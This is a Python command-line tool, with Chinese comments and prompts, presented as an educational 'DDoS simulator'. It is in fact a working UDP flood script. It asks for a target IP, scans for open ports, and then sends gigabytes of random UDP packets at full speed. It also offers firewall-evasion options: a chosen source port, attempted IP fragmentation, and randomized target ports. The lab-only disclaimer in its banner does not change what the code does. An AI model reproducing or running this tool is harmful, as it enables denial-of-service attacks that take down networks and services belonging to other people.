import sys
import os
import time
import socket
import ipaddress
import random

class DDoSSimulator:
    """UDP 数据包发送模拟器 (整合自动端口探测)"""

    def __init__(self):
        self.target_ip = None
        self.target_port = None          # 用户输入的端口（可为 None）
        self.user_provided_port = False  # 是否由用户指定了端口
        self.total_gb = 0.0
        self.max_packets = 0
        self.rate_limit = 0.0

        # 绕过选项
        self.source_port = None
        self.use_fragmentation = False
        self.random_target_port = False

        self.sock = None
        self.payload_size = 1490
        self.payload = None

        # 最终攻击端口（由 resolve_target_port 确定）
        self.final_port = None

    def show_banner(self):
        """显示法律警告（无艺术字）"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print("=" * 60)
        print("  DDOS-Attack 教育版 (防火墙绕过实验) v3.0")
        print("=" * 60)
        print("法律警告：")
        print("本工具仅用于教育目的，必须在完全隔离的实验室环境中使用。")
        print("你只能攻击自己拥有合法授权的设备。")
        print("未经授权的攻击是严重的犯罪行为，将承担法律责任。")
        print("=" * 60)
        input("按回车键继续，或按 Ctrl+C 退出...")

    def get_target_info(self):
        """获取并验证目标 IP、端口、流量、速率限制及绕过选项（不进行扫描）"""
        # ---------- 目标 IP ----------
        while True:
            try:
                ip_str = input("请输入目标 IP 地址: ").strip()
                ipaddress.ip_address(ip_str)
                self.target_ip = ip_str
                break
            except ValueError:
                print("[!] 无效的 IP 地址，请重新输入。")

        # ---------- 目标端口（支持留空）----------
        while True:
            try:
                port_str = input("请输入目标端口 (直接回车自动探测): ").strip()
                if port_str == "":
                    self.target_port = None
                    self.user_provided_port = False
                    break
                port = int(port_str)
                if 1 <= port <= 65535:
                    self.target_port = port
                    self.user_provided_port = True
                    break
                else:
                    print("[!] 端口必须在 1-65535 之间。")
            except ValueError:
                print("[!] 无效的端口号，请输入数字，或直接回车自动探测。")

        # ---------- 总流量 (GB) ----------
        while True:
            try:
                gb_str = input("请输入要发送的总数据量 (GB): ").strip()
                self.total_gb = float(gb_str)
                if self.total_gb <= 0:
                    print("[!] 流量必须大于 0 GB。")
                    continue
                break
            except ValueError:
                print("[!] 无效的数值，请输入数字。")

        # ---------- 发包间隔 (速率限制) ----------
        try:
            rate_str = input("请输入发包间隔（秒，0 表示不限速，例如 0.1）: ").strip()
            self.rate_limit = float(rate_str)
        except ValueError:
            self.rate_limit = 0.0

        # ---------- 绕过选项 ----------
        print("\n--- 防火墙绕过选项 (仅供实验) ---")
        src = input("指定源端口 (留空则系统随机分配): ").strip()
        self.source_port = int(src) if src else None

        frag = input("启用 IP 分片? (y/N): ").strip().lower()
        self.use_fragmentation = (frag == 'y')

        rnd = input("使用随机目标端口? (y/N): ").strip().lower()
        self.random_target_port = (rnd == 'y')

        # ---------- 计算总包数 ----------
        if self.use_fragmentation:
            self.payload_size = 3000
        else:
            self.payload_size = 1490

        total_bytes = int(self.total_gb * 1024 * 1024 * 1024)
        self.max_packets = total_bytes // self.payload_size
        print(f"\n[*] 将发送 {self.max_packets} 个数据包，总计 {self.total_gb:.2f} GB。")
        if self.rate_limit > 0:
            print(f"[*] 发包间隔: {self.rate_limit} 秒")
        if self.source_port is not None:
            print(f"[*] 源端口: {self.source_port}")
        if self.use_fragmentation:
            print(f"[*] IP 分片已启用，单包载荷 {self.payload_size} 字节")
        if self.random_target_port:
            print("[*] 随机目标端口模式已启用")

    # ==================== 端口探测相关方法 ====================

    def check_target(self, ip, port):
        """简单 TCP 连接测试，返回 True/False"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            s.connect((ip, port))
            s.close()
            return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False

    def discover_open_port(self, ip, port_range):
        """扫描端口范围，返回第一个开放的端口号，同时显示正在探测的端口"""
        print(f"[*] 正在扫描端口 {min(port_range)}-{max(port_range)}，请耐心等待...")
        try:
            for p in port_range:
                print(f"[>] 正在探测端口: {p}")
                if self.check_target(ip, p):
                    return p
        except KeyboardInterrupt:
            print("\n[!] 扫描被用户中断。")
            return None
        return None

    def resolve_target_port(self):
        """根据用户输入或自动扫描，确定最终攻击端口，并返回该端口"""
        if self.target_port is not None and self.user_provided_port:
            print(f"[*] 正在检查端口 {self.target_port} 的连通性...")
            if self.check_target(self.target_ip, self.target_port):
                print(f"[+] 端口 {self.target_port} 可达，将直接使用。")
                return self.target_port
            else:
                print(f"[!] 端口 {self.target_port} 不可达。")
                scan_choice = input("[?] 是否启动端口扫描以寻找可用端口？(y/n): ").strip().lower()
                if scan_choice == 'y':
                    ports = self._select_scan_range()
                    alt_port = self.discover_open_port(self.target_ip, ports)
                    if alt_port is not None:
                        print(f"[+] 已找到开放端口: {alt_port}")
                        return alt_port
                    else:
                        print("[!] 未发现任何开放端口。")
                        while True:
                            force_choice = input("[?] 是否使用原端口强制发送？(y/n): ").strip().lower()
                            if force_choice == 'y':
                                print(f"[*] 将使用原端口 {self.target_port} 强制发送。")
                                return self.target_port
                            elif force_choice == 'n':
                                print("[*] 用户取消攻击。")
                                sys.exit(0)
                            else:
                                print("[!] 请输入 y 或 n。")
                else:
                    # 不扫描，直接询问是否强制
                    while True:
                        force_choice = input("[?] 是否使用原端口强制发送？(y/n): ").strip().lower()
                        if force_choice == 'y':
                            print(f"[*] 将使用原端口 {self.target_port} 强制发送。")
                            return self.target_port
                        elif force_choice == 'n':
                            print("[*] 用户取消攻击。")
                            sys.exit(0)
                        else:
                            print("[!] 请输入 y 或 n。")
        else:
            # 用户未指定端口，强制扫描
            print("[*] 用户未指定端口，启动端口扫描...")
            ports = self._select_scan_range()
            final = self.discover_open_port(self.target_ip, ports)
            if final is None:
                print("[!] 未探测到任何开放端口，攻击无法继续。")
                sys.exit(1)
            print(f"[+] 探测成功，将使用开放端口: {final}")
            return final

    def _select_scan_range(self):
        """提供扫描模式选择，返回可迭代的端口范围"""
        print("\n请选择扫描模式：")
        print("1. 快速扫描 (常用端口)")
        print("2. 全端口扫描 (1-65535，耗时较长)")
        print("3. 自定义范围")
        mode = input("[?] 请输入选项 (1/2/3): ").strip()
        if mode == '1':
            return [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
        elif mode == '2':
            return range(1, 65536)
        elif mode == '3':
            while True:
                try:
                    start_port = int(input("[?] 起始端口: "))
                    end_port = int(input("[?] 结束端口: "))
                    if start_port < 1 or end_port > 65535 or start_port > end_port:
                        print("[!] 端口范围无效，将使用快速扫描。")
                        return [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
                    return range(start_port, end_port + 1)
                except ValueError:
                    print("[!] 输入无效，将使用快速扫描。")
                    return [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]
        else:
            print("[!] 选项无效，将使用快速扫描。")
            return [80, 443, 22, 8080, 8443, 53, 21, 25, 110, 143, 993, 995, 3306, 5432, 3389, 5900]

    # ==================== 攻击发送 ====================

    def send_packets(self):
        """发送 UDP 数据包，包含绕过功能和 GB 输出"""
        print(f"\n[*] 目标: {self.target_ip}:{self.final_port}")
        print(f"[*] 发送数据包数量: {self.max_packets}")
        print(f"[*] 发包速率限制: {self.rate_limit if self.rate_limit > 0 else '无（最大速度）'}")
        print("[*] 按 Ctrl+C 停止。\n")

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # 源端口绑定
        if self.source_port is not None:
            try:
                self.sock.bind(('', self.source_port))
            except OSError as e:
                print(f"[!] 无法绑定源端口 {self.source_port}: {e}")
                self.sock.close()
                sys.exit(1)

        # IP 分片设置（失败则降级）
        frag_enabled = False
        if self.use_fragmentation:
            try:
                if hasattr(socket, 'IP_MTU_DISCOVER') and hasattr(socket, 'IP_PMTUDISC_DO'):
                    self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
                    self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAGMENT, 0)
                    frag_enabled = True
                else:
                    raise AttributeError("IP_MTU_DISCOVER not available")
            except (AttributeError, OSError) as e:
                print(f"[!] 无法启用 IP 分片 ({e})，将使用普通发送模式（载荷 1490 字节）。")
                self.payload_size = 1490
                total_bytes = int(self.total_gb * 1024 * 1024 * 1024)
                self.max_packets = total_bytes // self.payload_size
                print(f"[*] 调整后总包数: {self.max_packets}")

        self.payload = os.urandom(self.payload_size)

        sent = 0
        sent_bytes = 0
        next_mb_threshold = 1024 * 1024   # 每 1 MB 输出
        start_time = time.time()

        try:
            while sent < self.max_packets:
                if self.random_target_port:
                    current_port = random.randint(1, 65535)
                else:
                    current_port = self.final_port

                self.sock.sendto(self.payload, (self.target_ip, current_port))
                sent += 1
                sent_bytes += self.payload_size

                if not self.random_target_port:
                    self.final_port += 1
                    if self.final_port > 65534:
                        self.final_port = 1

                # 每 1 MB 输出一次，单位为 GB
                if sent_bytes >= next_mb_threshold:
                    gb_sent = sent_bytes / (1024 * 1024 * 1024)
                    elapsed = time.time() - start_time
                    pps = sent / elapsed if elapsed > 0 else 0
                    print(f"[>] 已发送: {sent} 包 ({gb_sent:.4f} GB) | 用时: {elapsed:.1f}s | 速率: {pps:.1f} pps")
                    next_mb_threshold += 1024 * 1024

                if self.rate_limit > 0:
                    time.sleep(self.rate_limit)

        except KeyboardInterrupt:
            print(f"\n\n[!] 用户手动停止发送。")
        except Exception as e:
            print(f"\n[!] 错误: {e}")
        finally:
            self.sock.close()
            elapsed = time.time() - start_time
            print(f"\n[+] 发送完成。总包数: {sent}, 总数据量: {sent_bytes / (1024*1024*1024):.4f} GB, 用时: {elapsed:.2f} 秒。")

    # ==================== 主流程 ====================

    def run(self):
        self.show_banner()
        self.get_target_info()

        # 最终确认
        while True:
            confirm = input("\n[!] 最后警告：你即将向目标发送大量 UDP 流量。请确认 (yes/no): ").strip().lower()
            if confirm == 'yes':
                break
            elif confirm == 'no':
                print("[*] 用户取消。")
                sys.exit(0)
            else:
                print("[!] 请输入 yes 或 no。")

        # 确定最终攻击端口（包含自动探测/扫描）
        self.final_port = self.resolve_target_port()

        # 开始发送
        self.send_packets()


if __name__ == "__main__":
    try:
        simulator = DDoSSimulator()
        simulator.run()
    except KeyboardInterrupt:
        print("\n[*] 程序被用户终止。")
        sys.exit(0)
